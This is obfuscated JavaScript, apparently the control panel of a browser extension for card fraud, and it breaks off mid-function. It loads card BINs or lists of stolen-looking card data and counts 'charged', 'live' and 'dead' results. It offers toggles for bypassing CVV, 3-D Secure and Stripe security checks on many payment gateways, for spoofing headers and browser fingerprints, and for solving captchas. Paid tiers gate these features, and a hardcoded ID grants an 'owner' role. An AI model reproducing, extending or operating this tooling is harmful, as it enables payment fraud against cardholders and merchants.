(function () {
  'use strict';

  const _0x5ef1f9 = document.getElementById("cc-bin-mode-btn");
  const _0x4f0a0e = document.getElementById("cc-cc-list-mode-btn");
  const _0x115f8b = document.getElementById("cc-bin-mode-content");
  const _0x84c001 = document.getElementById("cc-cc-list-mode-content");
  const _0x349d07 = document.getElementById("cc-bin-input");
  const _0x25a178 = document.getElementById("cc-cvv-input");
  const _0x59238e = document.getElementById("cc-expiry-month-select");
  const _0x3cd79c = document.getElementById("cc-expiry-year-select");
  const _0x562e4d = document.getElementById("cc-list-input");
  const _0x2873a4 = document.getElementById("cc-list-counter");
  const _0x15f97b = document.getElementById("cc-card-replacement-toggle");
  const _0x2f1040 = document.getElementById("cc-card-replacement-content");
  const _0x22c73a = document.getElementById("cc-card-replacement-hint");
  const _0x2e34e4 = document.getElementById("cc-cvv-bypass-toggle");
  const _0x4987bf = document.getElementById("cc-cvv-bypass-content");
  const _0x24377 = document.getElementById("cc-payment-user-agent-bypass-toggle");
  const _0x59583c = document.getElementById("cc-payment-user-agent-bypass-content");
  const _0x20ba98 = document.getElementById("cc-pua-country-select");
  const _0x502bf8 = document.getElementById("cc-stripe-security-bypass-toggle");
  const _0x2cdccf = document.getElementById("cc-stripe-security-bypass-content");
  const _0x5e5c39 = document.getElementById("cc-three-ds-bypass-toggle");
  const _0x22a726 = document.getElementById("cc-three-ds-bypass-content");
  const _0x3db678 = document.getElementById("cc-anti-detect-toggle");
  const _0x3b5668 = document.getElementById("cc-anti-detect-content");
  const _0x547da7 = document.getElementById("cc-captcha-solver-toggle");
  const _0x577ebe = document.getElementById("cc-captcha-solver-content");
  const _0x446327 = document.getElementById("cc-auto-clicker-toggle");
  const _0x265e55 = document.getElementById("cc-auto-clicker-content");
  const _0xd615a = document.getElementById("cc-auto-clicker-interval");
  const _0x347b52 = document.getElementById("cc-auto-clicker-selector");
  const _0x17d499 = document.getElementById("cc-start-btn");
  const _0x51c2ca = document.getElementById("cc-running-stop-btn");
  const _0x356e69 = document.getElementById("cc-stop-loading-overlay");
  const _0x2b73b3 = document.getElementById("cc-stat-total");
  const _0x5464f3 = document.getElementById("cc-stat-charged");
  const _0x49aca0 = document.getElementById("cc-stat-live");
  const _0x15ba15 = document.getElementById("cc-stat-dead");
  const _0x439922 = {
    CC_SETTINGS: "tyagrey_custom_checkout_settings",
    CC_LIST_DATA: "tyagrey_cc_list_data",
    CC_STARTED: "tyagrey_cc_started",
    CC_MODE: "tyagrey_cc_mode",
    SAVED_BINS: "tyagrey_saved_bins",
    PANEL_QUICK_BINS: "tyagrey_panel_quick_bins"
  };
  let _0x1c671e = false;
  let _0x43b02c = [];
  let _0x5efb32 = "user";
  let _0x16189f = null;
  async function _0x5e5b33() {
    return new Promise(_0x16df5d => {
      if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
        chrome.storage.local.get(["tyagrey_role", "tyagrey_chat_id", "tyagrey_user_id"], function (_0x2cd803) {
          var _0x3b7498 = _0x2cd803.tyagrey_role || "user";
          console.log("[TYAgrey][CustomCheckout] Role from storage:", _0x2cd803.tyagrey_role, "chat_id:", _0x2cd803.tyagrey_chat_id, "user_id:", _0x2cd803.tyagrey_user_id);
          if ((_0x2cd803.tyagrey_chat_id || "") == "7715922791" || (_0x2cd803.tyagrey_user_id || "") == "7715922791") {
            _0x3b7498 = "owner";
            console.log("[TYAgrey][CustomCheckout] Forced owner role due to ID match");
          }
          _0x5efb32 = _0x3b7498;
          console.log("[TYAgrey][CustomCheckout] Final detected role:", _0x3b7498);
          _0x16df5d(_0x3b7498);
        });
      } else {
        console.log("[TYAgrey][CustomCheckout] Chrome storage not available, defaulting to user");
        _0x16df5d("user");
      }
    });
  }
  function _0x54462b() {
    console.log("[TYAgrey][CustomCheckout] applyRoleRestrictions called with userRole:", _0x5efb32);
    const _0x4ffd09 = _0x5efb32 === "user";
    const _0x3e775c = _0x5efb32 === "pro";
    const _0x410c76 = ["pro_plus", "admin", "owner"].includes(_0x5efb32);
    console.log("[TYAgrey][CustomCheckout] Role flags - isNormal:", _0x4ffd09, "isPro:", _0x3e775c, "isFullAccess:", _0x410c76);
    if (_0x17d499) {
      if (_0x16189f && !_0x4ffd09) {
        _0x17d499.removeEventListener("click", _0x16189f, true);
        _0x16189f = null;
        delete _0x17d499.dataset.lockedListener;
      }
      _0x17d499.classList.remove("cc-locked-start");
      if (!_0x4ffd09 && !_0x3e775c) {
        _0x17d499.textContent = "▶ Start";
      }
    }
    ["cc-card-replacement-stripe", "cc-card-replacement-adyen", "cc-card-replacement-checkout", "cc-card-replacement-recurly", "cc-card-replacement-xsolla", "cc-card-replacement-woocommerce", "cc-card-replacement-braintree", "cc-card-replacement-square", "cc-card-replacement-paypal", "cc-card-replacement-amex", "cc-cvv-stripe", "cc-cvv-adyen", "cc-cvv-checkout", "cc-cvv-recurly", "cc-cvv-xsolla", "cc-cvv-woocommerce", "cc-cvv-braintree", "cc-cvv-square", "cc-cvv-paypal", "cc-cvv-amex", "cc-security-pasted", "cc-security-timing", "cc-security-tracking", "cc-security-zip"].forEach(_0x4a0414 => {
      const _0x8c2abe = document.getElementById(_0x4a0414);
      if (_0x8c2abe) {
        const _0x5b35b7 = _0x8c2abe.closest(".cc-gateway-row");
        if (_0x5b35b7) {
          _0x5b35b7.classList.remove("locked-row");
        }
        _0x8c2abe.disabled = false;
      }
    });
    document.querySelectorAll(".cc-select-all-btn, .cc-unselect-all-btn").forEach(_0x177a06 => {
      _0x177a06.disabled = false;
      _0x177a06.style.opacity = "1";
      _0x177a06.style.pointerEvents = "auto";
    });
    document.querySelectorAll(".cc-toggle").forEach(_0x51601f => _0x51601f.classList.remove("locked"));
    if (_0x5ef1f9) {
      _0x5ef1f9.disabled = false;
      _0x5ef1f9.style.opacity = "1";
      _0x5ef1f9.style.pointerEvents = "auto";
    }
    if (_0x4f0a0e) {
      _0x4f0a0e.disabled = false;
      _0x4f0a0e.style.opacity = "1";
      _0x4f0a0e.style.pointerEvents = "auto";
    }
    const _0x4f2e1f = document.getElementById("cc-refresh-tabs-btn");
    const _0xf62c11 = document.getElementById("cc-show-all-tabs-btn");
    const _0x4c5a57 = document.getElementById("cc-select-all-btn");
    [_0x4f2e1f, _0xf62c11, _0x4c5a57].forEach(_0x210b70 => {
      if (_0x210b70) {
        _0x210b70.disabled = false;
        _0x210b70.style.opacity = "1";
        _0x210b70.style.pointerEvents = "auto";
      }
    });
    if (_0x20ba98) {
      _0x20ba98.disabled = false;
    }
    if (_0x24377) {
      const _0x420596 = _0x24377.closest(".section-header");
      if (_0x420596) {
        _0x420596.classList.remove("locked-section");
      }
    }
    if (_0x349d07) {
      _0x349d07.disabled = false;
    }
    if (_0x25a178) {
      _0x25a178.disabled = false;
    }
    if (_0x59238e) {
      _0x59238e.disabled = false;
    }
    if (_0x3cd79c) {
      _0x3cd79c.disabled = false;
    }
    if (_0x562e4d) {
      _0x562e4d.disabled = false;
    }
    if (_0x4ffd09) {
      if (_0x17d499) {
        _0x17d499.disabled = false;
        _0x17d499.textContent = "🔒 Upgrade to Pro";
        _0x17d499.title = "Multiple Checkout Bypass is a Pro feature. Upgrade to use it.";
        _0x17d499.classList.add("cc-locked-start");
        if (!_0x17d499.dataset.lockedListener) {
          _0x17d499.dataset.lockedListener = "1";
          _0x16189f = function _0x4f80fb(_0x285386) {
            if (_0x5efb32 === "user") {
              _0x285386.preventDefault();
              _0x285386.stopPropagation();
              _0x3ff9f8("Multiple Checkout Bypass is a Pro feature. Upgrade to Pro to use it.", "error");
            }
          };
          _0x17d499.addEventListener("click", _0x16189f, true);
        }
      }
      [_0x15f97b, _0x2e34e4, _0x24377, _0x502bf8, _0x5e5c39, _0x3db678, _0x547da7, _0x446327].forEach(_0x1970bb => {
        if (_0x1970bb) {
          _0x1970bb.disabled = true;
          _0x1970bb.checked = false;
          const _0x176cb6 = _0x1970bb.closest(".cc-toggle");
          if (_0x176cb6) {
            _0x176cb6.classList.add("locked");
          }
        }
      });
      [_0x2f1040, _0x4987bf, _0x59583c, _0x2cdccf, _0x22a726, _0x3b5668, _0x577ebe, _0x265e55].forEach(_0x5071f1 => {
        if (_0x5071f1) {
          _0x5071f1.classList.add("cc-hidden");
        }
      });
      ["cc-card-replacement-stripe", "cc-card-replacement-adyen", "cc-card-replacement-checkout", "cc-card-replacement-recurly", "cc-card-replacement-xsolla", "cc-card-replacement-woocommerce", "cc-card-replacement-braintree", "cc-card-replacement-square", "cc-card-replacement-paypal", "cc-card-replacement-amex", "cc-cvv-stripe", "cc-cvv-adyen", "cc-cvv-checkout", "cc-cvv-recurly", "cc-cvv-xsolla", "cc-cvv-woocommerce", "cc-cvv-braintree", "cc-cvv-square", "cc-cvv-paypal", "cc-cvv-amex", "cc-security-pasted", "cc-security-timing", "cc-security-tracking", "cc-security-zip"].forEach(_0x49e4ad => {
        const _0x3ec9da = document.getElementById(_0x49e4ad);
        if (_0x3ec9da) {
          const _0xf6e4f7 = _0x3ec9da.closest(".cc-gateway-row");
          if (_0xf6e4f7) {
            _0xf6e4f7.classList.add("locked-row");
          }
          _0x3ec9da.checked = false;
          _0x3ec9da.disabled = true;
        }
      });
      document.querySelectorAll(".cc-select-all-btn, .cc-unselect-all-btn").forEach(_0x4ff8cb => {
        _0x4ff8cb.disabled = true;
        _0x4ff8cb.style.opacity = "0.4";
        _0x4ff8cb.style.pointerEvents = "none";
      });
      if (_0x5ef1f9) {
        _0x5ef1f9.disabled = true;
        _0x5ef1f9.style.opacity = "0.4";
        _0x5ef1f9.style.pointerEvents = "none";
      }
      if (_0x4f0a0e) {
        _0x4f0a0e.disabled = true;
        _0x4f0a0e.style.opacity = "0.4";
        _0x4f0a0e.style.pointerEvents = "none";
      }
      const _0x35ccb3 = document.getElementById("cc-refresh-tabs-btn");
      const _0x31a9d8 = document.getElementById("cc-show-all-tabs-btn");
      const _0x1fef77 = document.getElementById("cc-select-all-btn");
      [_0x35ccb3, _0x31a9d8, _0x1fef77].forEach(_0x2e49b5 => {
        if (_0x2e49b5) {
          _0x2e49b5.disabled = true;
          _0x2e49b5.style.opacity = "0.4";
          _0x2e49b5.style.pointerEvents = "none";
        }
      });
      if (_0x20ba98) {
        _0x20ba98.disabled = true;
      }
      if (_0x349d07) {
        _0x349d07.disabled = true;
      }
      if (_0x25a178) {
        _0x25a178.disabled = true;
      }
      if (_0x59238e) {
        _0x59238e.disabled = true;
      }
      if (_0x3cd79c) {
        _0x3cd79c.disabled = true;
      }
      if (_0x562e4d) {
        _0x562e4d.disabled = true;
      }
      return;
    }
    if (_0x3e775c) {
      ["cc-card-replacement-stripe", "cc-card-replacement-adyen", "cc-card-replacement-checkout", "cc-card-replacement-recurly", "cc-cvv-stripe", "cc-cvv-adyen", "cc-cvv-checkout", "cc-cvv-recurly"].forEach(_0x8d86d2 => {
        const _0x17a50d = document.getElementById(_0x8d86d2);
        if (_0x17a50d) {
          const _0x158cff = _0x17a50d.closest(".cc-gateway-row");
          if (_0x158cff) {
            _0x158cff.classList.remove("locked-row");
          }
          _0x17a50d.disabled = false;
        }
      });
      ["cc-card-replacement-xsolla", "cc-card-replacement-woocommerce", "cc-card-replacement-braintree", "cc-card-replacement-square", "cc-card-replacement-paypal", "cc-card-replacement-amex"].forEach(_0xf03400 => {
        const _0x22cc4d = document.getElementById(_0xf03400);
        if (_0x22cc4d) {
          const _0x25a6fd = _0x22cc4d.closest(".cc-gateway-row");
          if (_0x25a6fd) {
            _0x25a6fd.classList.add("locked-row");
          }
          _0x22cc4d.checked = false;
          _0x22cc4d.disabled = true;
        }
      });
      ["cc-cvv-xsolla", "cc-cvv-woocommerce", "cc-cvv-braintree", "cc-cvv-square", "cc-cvv-paypal", "cc-cvv-amex"].forEach(_0x11a44a => {
        const _0x12a08a = document.getElementById(_0x11a44a);
        if (_0x12a08a) {
          const _0x28e617 = _0x12a08a.closest(".cc-gateway-row");
          if (_0x28e617) {
            _0x28e617.classList.add("locked-row");
          }
          _0x12a08a.checked = false;
          _0x12a08a.disabled = true;
        }
      });
      if (_0x24377) {
        _0x24377.checked = false;
        _0x24377.disabled = true;
        const _0x2008b2 = _0x24377.closest(".section-header");
        if (_0x2008b2) {
          _0x2008b2.classList.add("locked-section");
        }
        if (_0x59583c) {
          _0x59583c.classList.add("cc-hidden");
        }
      }
      if (_0x20ba98) {
        _0x20ba98.disabled = true;
      }
      ["cc-pua-enabled", "cc-pua-referer", "cc-pua-accept-lang", "cc-pua-xforward", "cc-pua-cf-ip", "cc-pua-sec-fetch"].forEach(_0x2820df => {
        const _0x211651 = document.getElementById(_0x2820df);
        if (_0x211651) {
          _0x211651.checked = false;
          _0x211651.disabled = true;
        }
      });
      if (_0x3db678) {
        _0x3db678.checked = false;
        _0x3db678.disabled = true;
        const _0x183238 = _0x3db678.closest(".section-header");
        if (_0x183238) {
          _0x183238.classList.add("locked-section");
        }
        if (_0x3b5668) {
          _0x3b5668.classList.add("cc-hidden");
        }
      }
      ["cc-ad-webgl", "cc-ad-audio", "cc-ad-timezone", "cc-ad-locale", "cc-ad-canvas", "cc-ad-battery", "cc-ad-memory", "cc-ad-plugins"].forEach(_0x13cd21 => {
        const _0x50fee1 = document.getElementById(_0x13cd21);
        if (_0x50fee1) {
          _0x50fee1.checked = false;
          _0x50fee1.disabled = true;
        }
      });
    } else if (_0x410c76) {
      ["cc-card-replacement-stripe", "cc-card-replacement-adyen", "cc-card-replacement-checkout", "cc-card-replacement-recurly", "cc-card-replacement-xsolla", "cc-card-replacement-woocommerce", "cc-card-replacement-braintree", "cc-card-replacement-square", "cc-card-replacement-paypal", "cc-card-replacement-amex", "cc-cvv-stripe", "cc-cvv-adyen", "cc-cvv-checkout", "cc-cvv-recurly", "cc-cvv-xsolla", "cc-cvv-woocommerce", "cc-cvv-braintree", "cc-cvv-square", "cc-cvv-paypal", "cc-cvv-amex"].forEach(_0x5abc75 => {
        const _0x313654 = document.getElementById(_0x5abc75);
        if (_0x313654) {
          const _0x1790a6 = _0x313654.closest(".cc-gateway-row");
          if (_0x1790a6) {
            _0x1790a6.classList.remove("locked-row");
          }
          _0x313654.disabled = false;
        }
      });
      if (_0x24377) {
        _0x24377.disabled = false;
        const _0x2fd1c8 = _0x24377.closest(".section-header");
        if (_0x2fd1c8) {
          _0x2fd1c8.classList.remove("locked-section");
        }
      }
      if (_0x20ba98) {
        _0x20ba98.disabled = false;
      }
      ["cc-pua-enabled", "cc-pua-referer", "cc-pua-accept-lang", "cc-pua-xforward", "cc-pua-cf-ip", "cc-pua-sec-fetch"].forEach(_0x4729c3 => {
        const _0x4afc46 = document.getElementById(_0x4729c3);
        if (_0x4afc46) {
          _0x4afc46.disabled = false;
        }
      });
      if (_0x3db678) {
        _0x3db678.disabled = false;
        const _0x237181 = _0x3db678.closest(".section-header");
        if (_0x237181) {
          _0x237181.classList.remove("locked-section");
        }
      }
      ["cc-ad-webgl", "cc-ad-audio", "cc-ad-timezone", "cc-ad-locale", "cc-ad-canvas", "cc-ad-battery", "cc-ad-memory", "cc-ad-plugins"].forEach(_0x37ae47 => {
        const _0x95e464 = document.getElementById(_0x37ae47);
        if (_0x95e464) {
          _0x95e464.disabled = false;
        }
      });
    }
  }
  if (_0x3cd79c) {
    const _0x2a5416 = document.createElement("option");
    _0x2a5416.value = "RND";
    _0x2a5416.textContent = "RND";
    _0x2a5416.selected = true;
    _0x3cd79c.appendChild(_0x2a5416);
    const _0x28f369 = new Date().getFullYear();
    for (let _0x291bf1 = 0; _0x291bf1 <= 10; _0x291bf1++) {
      const _0x15717b = document.createElement("option");
      _0x15717b.value = String(_0x28f369 + _0x291bf1);
      _0x15717b.textContent = String(_0x28f369 + _0x291bf1);
      _0x3cd79c.appendChild(_0x15717b);
    }
  }
  function _0xd566cf() {
    if (typeof window !== "undefined" && window.tyagreyStorage) {
      return window.tyagreyStorage;
    } else {
      return null;
    }
  }
  function _0x34a624(_0x1f3458) {
    return new Promise(_0x51a8d5 => {
      if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
        chrome.storage.local.set(_0x1f3458, _0x51a8d5);
      } else {
        _0x51a8d5();
      }
    });
  }
  function _0x492a78(_0x263536) {
    return new Promise(_0x2bcd50 => {
      if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
        chrome.storage.local.get(_0x263536, _0x2bcd50);
      } else {
        _0x2bcd50({});
      }
    });
  }
  const _0x709a8e = [{
    code: "US",
    name: "United States"
  }, {
    code: "GB",
    name: "United Kingdom"
  }, {
    code: "CA",
    name: "Canada"
  }, {
    code: "AU",
    name: "Australia"
  }, {
    code: "DE",
    name: "Germany"
  }, {
    code: "FR",
    name: "France"
  }, {
    code: "JP",
    name: "Japan"
  }, {
    code: "SG",
    name: "Singapore"
  }, {
    code: "NL",
    name: "Netherlands"
  }, {
    code: "SE",
    name: "Sweden"
  }, {
    code: "CH",
    name: "Switzerland"
  }, {
    code: "IT",
    name: "Italy"
  }, {
    code: "ES",
    name: "Spain"
  }, {
    code: "BR",
    name: "Brazil"
  }, {
    code: "IN",
    name: "India"
  }, {
    code: "RU",
    name: "Russian Federation"
  }, {
    code: "CN",
    name: "China"
  }, {
    code: "KR",
    name: "Korea, Republic of"
  }, {
    code: "MX",
    name: "Mexico"
  }, {
    code: "ZA",
    name: "South Africa"
  }, {
    code: "AE",
    name: "United Arab Emirates"
  }, {
    code: "SA",
    name: "Saudi Arabia"
  }, {
    code: "TR",
    name: "Turkey"
  }, {
    code: "PL",
    name: "Poland"
  }, {
    code: "BE",
    name: "Belgium"
  }, {
    code: "AT",
    name: "Austria"
  }, {
    code: "NO",
    name: "Norway"
  }, {
    code: "DK",
    name: "Denmark"
  }, {
    code: "FI",
    name: "Finland"
  }, {
    code: "IE",
    name: "Ireland"
  }, {
    code: "PT",
    name: "Portugal"
  }, {
    code: "GR",
    name: "Greece"
  }, {
    code: "CZ",
    name: "Czechia"
  }, {
    code: "HU",
    name: "Hungary"
  }, {
    code: "IL",
    name: "Israel"
  }, {
    code: "NZ",
    name: "New Zealand"
  }, {
    code: "TH",
    name: "Thailand"
  }, {
    code: "MY",
    name: "Malaysia"
  }, {
    code: "PH",
    name: "Philippines"
  }, {
    code: "ID",
    name: "Indonesia"
  }, {
    code: "VN",
    name: "Viet Nam"
  }, {
    code: "UA",
    name: "Ukraine"
  }, {
    code: "RO",
    name: "Romania"
  }, {
    code: "CL",
    name: "Chile"
  }, {
    code: "AR",
    name: "Argentina"
  }, {
    code: "CO",
    name: "Colombia"
  }, {
    code: "PK",
    name: "Pakistan"
  }, {
    code: "BD",
    name: "Bangladesh"
  }, {
    code: "EG",
    name: "Egypt"
  }, {
    code: "NG",
    name: "Nigeria"
  }, {
    code: "KE",
    name: "Kenya"
  }, {
    code: "GH",
    name: "Ghana"
  }];
  function _0x3b0b1c() {
    if (!_0x20ba98) {
      return;
    }
    _0x20ba98.innerHTML = "<option value=\"\">Select country / region</option>";
    const _0x1666c6 = _0x709a8e.slice().sort((_0x36321c, _0x2603db) => _0x36321c.name.localeCompare(_0x2603db.name));
    _0x1666c6.forEach(function (_0x3823c7) {
      const _0x9eb053 = document.createElement("option");
      _0x9eb053.value = _0x3823c7.code;
      _0x9eb053.textContent = _0x3823c7.name + " (" + _0x3823c7.code + ")";
      _0x20ba98.appendChild(_0x9eb053);
    });
  }
  async function _0x405c5d(_0xaaaaef) {
    if (!_0xaaaaef) {
      return;
    }
    try {
      const _0x30c260 = "tyagrey_country_region_settings";
      const _0x929056 = await _0x492a78([_0x30c260]);
      const _0x275f66 = _0x929056[_0x30c260] || {};
      const _0x243355 = {};
      _0x709a8e.forEach(_0xbd45ee => _0x243355[_0xbd45ee.code] = _0xbd45ee.name);
      const _0x4811e9 = {
        enabled: true,
        countryCode: _0xaaaaef,
        countryName: _0x243355[_0xaaaaef] || _0x275f66.countryName || ""
      };
      await _0x34a624({
        [_0x30c260]: _0x4811e9
      });
      const _0xecff98 = document.getElementById("countryRegionEnabled");
      const _0xcd31f4 = document.getElementById("countryRegionSelect");
      const _0x20f734 = document.getElementById("countryRegionStatus");
      if (_0xecff98) {
        _0xecff98.checked = true;
      }
      if (_0xcd31f4) {
        _0xcd31f4.disabled = false;
        _0xcd31f4.style.opacity = "1";
        _0xcd31f4.value = _0xaaaaef;
      }
      if (_0x20f734) {
        _0x20f734.textContent = "Status: Enabled (" + _0x4811e9.countryName + ")";
      }
    } catch (_0x5804db) {}
  }
  async function _0x23a04d() {
    try {
      const _0x420db5 = "tyagrey_country_region_settings";
      const _0x5259fc = await _0x492a78([_0x420db5]);
      const _0x1d3998 = _0x5259fc[_0x420db5] || {};
      if (_0x1d3998.countryCode && _0x20ba98) {
        _0x20ba98.value = _0x1d3998.countryCode;
      }
    } catch (_0x398b4f) {}
  }
  function _0x58c1b3(_0x357734) {
    if (!_0x357734 || !_0x357734.trim()) {
      return [];
    }
    const _0x222188 = _0x357734.split(/[\n\r]+/).filter(_0x2a9023 => _0x2a9023.trim());
    const _0x497973 = [];
    for (const _0x55617e of _0x222188) {
      const _0xb75055 = _0x55617e.trim();
      if (!_0xb75055) {
        continue;
      }
      let _0x170227;
      if (_0xb75055.includes("|")) {
        _0x170227 = _0xb75055.split("|").map(_0x1ed1f7 => _0x1ed1f7.trim());
      } else if (_0xb75055.includes(",")) {
        _0x170227 = _0xb75055.split(",").map(_0x453a27 => _0x453a27.trim());
      } else {
        _0x170227 = _0xb75055.split(/\s+/);
      }
      if (_0x170227.length >= 4) {
        _0x497973.push({
          number: _0x170227[0],
          month: _0x170227[1],
          year: _0x170227[2],
          cvv: _0x170227[3]
        });
      } else if (_0x170227.length === 1 && _0x170227[0].length >= 13) {
        _0x497973.push({
          number: _0x170227[0],
          month: "RND",
          year: "RND",
          cvv: "RND"
        });
      }
    }
    return _0x497973;
  }
  function _0xa790b6(_0x3d6e7e) {
    const _0x3eff01 = String(_0x3d6e7e).replace(/\D/g, "");
    if (_0x3eff01.length < 13) {
      return false;
    }
    let _0x25cc26 = 0;
    let _0x3b711d = false;
    for (let _0x51127c = _0x3eff01.length - 1; _0x51127c >= 0; _0x51127c--) {
      let _0x292061 = parseInt(_0x3eff01.substring(_0x51127c, _0x51127c + 1), 10);
      if (_0x3b711d) {
        _0x292061 *= 2;
        if (_0x292061 > 9) {
          _0x292061 -= 9;
        }
      }
      _0x25cc26 += _0x292061;
      _0x3b711d = !_0x3b711d;
    }
    return _0x25cc26 % 10 === 0;
  }
  function _0x554823(_0xf6556d) {
    const _0x1bcba3 = new Date();
    const _0x26c62a = _0x1bcba3.getFullYear();
    const _0x382247 = _0x1bcba3.getMonth() + 1;
    return _0xf6556d.filter(_0x18df0f => {
      if (!_0x18df0f || !_0x18df0f.year || !_0x18df0f.month) {
        return true;
      }
      let _0x3b907b = parseInt(_0x18df0f.year, 10);
      let _0x136859 = parseInt(_0x18df0f.month, 10);
      if (isNaN(_0x3b907b) || isNaN(_0x136859)) {
        return true;
      }
      if (_0x3b907b < 100) {
        _0x3b907b += 2000;
      }
      if (_0x3b907b < _0x26c62a) {
        return false;
      }
      if (_0x3b907b === _0x26c62a && _0x136859 < _0x382247) {
        return false;
      }
      return true;
    });
  }
  function _0xb50b3e(_0x5dedd4, _0x57bd42) {
    return new Promise(_0x40660d => {
      if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
        chrome.runtime.sendMessage({
          type: _0x5dedd4,
          ..._0x57bd42
        }, _0x99535c => {
          _0x40660d(_0x99535c || {
            success: false
          });
        });
      } else {
        _0x40660d({
          success: false,
          error: "Extension API not available"
        });
      }
    });
  }
  function _0x47eb15(_0x582dd7, _0x32f052) {
    return new Promise(_0x49414d => {
      if (typeof chrome !== "undefined" && chrome.tabs) {
        chrome.tabs.query({
          active: true,
          currentWindow: true
        }, _0x3bca88 => {
          if (_0x3bca88 && _0x3bca88[0] && _0x3bca88[0].id) {
            chrome.tabs.sendMessage(_0x3bca88[0].id, {
              type: _0x582dd7,
              ..._0x32f052
            }, _0x1480b3 => {
              _0x49414d(_0x1480b3 || {
                success: false
              });
            });
          } else {
            _0x49414d({
              success: false,
              error: "No active tab"
            });
          }
        });
      } else {
        _0x49414d({
          success: false,
          error: "Extension API not available"
        });
      }
    });
  }
  function _0x2d24bb() {
    return {
      bin: "",
      cvv: "",
      expMonth: "",
      expYear: "",
      ccListText: "",
      mode: "bin",
      cardReplacementEnabled: true,
      cardReplacementGateways: {
        stripe: true,
        adyen: true,
        checkout: true,
        recurly: true,
        xsolla: true,
        woocommerce: true,
        braintree: true,
        square: true,
        paypal: true,
        amex: true
      },
      cvvBypassEnabled: true,
      cvvBypassGateways: {
        stripe: true,
        adyen: true,
        checkout: true,
        recurly: true,
        xsolla: true,
        woocommerce: true,
        braintree: true,
        square: true,
        paypal: true,
        amex: true
      },
      puaBypassEnabled: true,
      puaCountry: "",
      puaUserAgent: true,
      puaReferer: true,
      puaAcceptLang: true,
      puaXForward: true,
      puaCfIp: true,
      puaSecFetch: true,
      stripeSecurityEnabled: true,
      threeDsEnabled: true,
      securityPasted: true,
      securityTiming: false,
      securityTracking: true,
      securityZip: true,
      antiDetectEnabled: false,
      antiDetectWebGL: true,
      antiDetectAudio: true,
      antiDetectTimezone: true,
      antiDetectLocale: true,
      antiDetectCanvas: true,
      antiDetectBattery: true,
      antiDetectMemory: true,
      antiDetectPlugins: true,
      captchaSolverEnabled: false,
      captchaRecaptcha: true,
      captchaHcaptcha: true,
      autoClickerEnabled: false,
      autoClickerInterval: 500,
      autoClickerSelector: "",
      started: false
    };
  }
  async function _0x1a1d3b() {
    await _0x5e5b33();
    const _0x55f743 = _0x2d24bb();
    let _0x34c6eb = {};
    try {
      _0x34c6eb = await _0x492a78([_0x439922.CC_SETTINGS, _0x439922.CC_LIST_DATA, _0x439922.CC_STARTED, _0x439922.CC_MODE]);
    } catch (_0x48c759) {}
    let _0x40ecdd = _0x55f743;
    if (_0x34c6eb[_0x439922.CC_SETTINGS]) {
      try {
        _0x40ecdd = JSON.parse(_0x34c6eb[_0x439922.CC_SETTINGS]);
      } catch (_0x11b53d) {
        _0x40ecdd = _0x34c6eb[_0x439922.CC_SETTINGS];
      }
    }
    _0x40ecdd = {
      ..._0x55f743,
      ..._0x40ecdd
    };
    if (_0x5efb32 === "user" || !_0x5efb32) {
      _0x40ecdd.cardReplacementEnabled = false;
      _0x40ecdd.cvvBypassEnabled = false;
      _0x40ecdd.puaBypassEnabled = false;
      _0x40ecdd.stripeSecurityEnabled = false;
      _0x40ecdd.threeDsEnabled = false;
      _0x40ecdd.cardReplacementGateways = {
        stripe: false,
        adyen: false,
        checkout: false,
        recurly: false,
        xsolla: false,
        woocommerce: false,
        braintree: false,
        square: false,
        paypal: false,
        amex: false
      };
      _0x40ecdd.cvvBypassGateways = {
        stripe: false,
        adyen: false,
        checkout: false,
        recurly: false,
        xsolla: false,
        woocommerce: false,
        braintree: false,
        square: false,
        paypal: false,
        amex: false
      };
      _0x40ecdd.started = false;
    } else if (_0x5efb32 === "pro") {
      if (_0x40ecdd.cardReplacementGateways) {
        _0x40ecdd.cardReplacementGateways.xsolla = false;
        _0x40ecdd.cardReplacementGateways.woocommerce = false;
        _0x40ecdd.cardReplacementGateways.braintree = false;
        _0x40ecdd.cardReplacementGateways.square = false;
        _0x40ecdd.cardReplacementGateways.paypal = false;
        _0x40ecdd.cardReplacementGateways.amex = false;
      }
      if (_0x40ecdd.cvvBypassGateways) {
        _0x40ecdd.cvvBypassGateways.xsolla = false;
        _0x40ecdd.cvvBypassGateways.woocommerce = false;
        _0x40ecdd.cvvBypassGateways.braintree = false;
        _0x40ecdd.cvvBypassGateways.square = false;
        _0x40ecdd.cvvBypassGateways.paypal = false;
        _0x40ecdd.cvvBypassGateways.amex = false;
      }
      _0x40ecdd.puaBypassEnabled = false;
      _0x40ecdd.antiDetectEnabled = false;
      _0x40ecdd.antiDetectWebGL = false;
      _0x40ecdd.antiDetectAudio = false;
      _0x40ecdd.antiDetectTimezone = false;
      _0x40ecdd.antiDetectLocale = false;
      _0x40ecdd.antiDetectCanvas = false;
      _0x40ecdd.antiDetectBattery = false;
      _0x40ecdd.antiDetectMemory = false;
      _0x40ecdd.antiDetectPlugins = false;
    }
    const _0x588579 = ["tyagrey_cc_bin", "tyagrey_cc_cvv", "tyagrey_cc_exp_month", "tyagrey_cc_exp_year", "tyagrey_cc_list", "tyagrey_cc_mode", "tyagrey_cc_started"];
    const _0x32d184 = {};
    _0x588579.forEach(_0x2c4a56 => {
      const _0x2d8f7f = localStorage.getItem(_0x2c4a56);
      if (_0x2d8f7f !== null) {
        try {
          _0x32d184[_0x2c4a56] = JSON.parse(_0x2d8f7f);
        } catch {
          _0x32d184[_0x2c4a56] = _0x2d8f7f;
        }
      }
    });
    if (_0x32d184.tyagrey_cc_bin !== undefined) {
      _0x40ecdd.bin = _0x32d184.tyagrey_cc_bin;
    }
    if (_0x32d184.tyagrey_cc_cvv !== undefined) {
      _0x40ecdd.cvv = _0x32d184.tyagrey_cc_cvv;
    }
    if (_0x32d184.tyagrey_cc_exp_month !== undefined) {
      _0x40ecdd.expMonth = _0x32d184.tyagrey_cc_exp_month;
    }
    if (_0x32d184.tyagrey_cc_exp_year !== undefined) {
      _0x40ecdd.expYear = _0x32d184.tyagrey_cc_exp_year;
    }
    if (_0x32d184.tyagrey_cc_list !== undefined) {
      _0x40ecdd.ccListText = _0x32d184.tyagrey_cc_list;
    }
    if (_0x32d184.tyagrey_cc_mode !== undefined) {
      _0x40ecdd.mode = _0x32d184.tyagrey_cc_mode;
    }
    if (_0x32d184.tyagrey_cc_started !== undefined) {
      _0x40ecdd.started = !!_0x32d184.tyagrey_cc_started;
    }
    if (_0x349d07) {
